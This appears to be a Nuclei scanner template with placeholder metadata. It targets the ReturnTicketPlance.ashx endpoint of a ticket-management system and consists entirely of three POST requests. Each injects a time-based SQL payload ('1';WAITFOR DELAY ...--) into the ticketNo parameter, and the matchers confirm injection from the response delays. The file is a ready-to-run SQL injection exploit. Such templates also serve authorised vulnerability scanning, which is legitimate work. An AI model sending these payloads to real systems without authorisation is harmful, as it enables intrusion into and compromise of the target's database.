id: zckx-ReturnTicketPlance-sqli
info:
  name: Template Name
  author: apple
  severity: high
  description: description
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /SystemManager/TicketSystem/ReturnTicketPlance.ashx HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Cookie: ASPSESSIONIDCCRBRCTD=LHLBDIBAKDEGBCJGKIKMNODE
        Content-Type: application/x-www-form-urlencoded

        Method=GetCheckInDetail&ticketNo=1'%3bWAITFOR%2bDELAY'0%3a0%3a3'--%2b
      - |-
        POST /SystemManager/TicketSystem/ReturnTicketPlance.ashx HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Cookie: ASPSESSIONIDCCRBRCTD=LHLBDIBAKDEGBCJGKIKMNODE
        Content-Type: application/x-www-form-urlencoded

        Method=GetCheckInDetail&ticketNo=1'%3bWAITFOR%2bDELAY'0%3a0%3a6'--%2b
      - |-
        POST /SystemManager/TicketSystem/ReturnTicketPlance.ashx HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Cookie: ASPSESSIONIDCCRBRCTD=LHLBDIBAKDEGBCJGKIKMNODE
        Content-Type: application/x-www-form-urlencoded

        Method=GetCheckInDetail&ticketNo=1'%3bWAITFOR%2bDELAY'0%3a0%3a9'--%2b
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"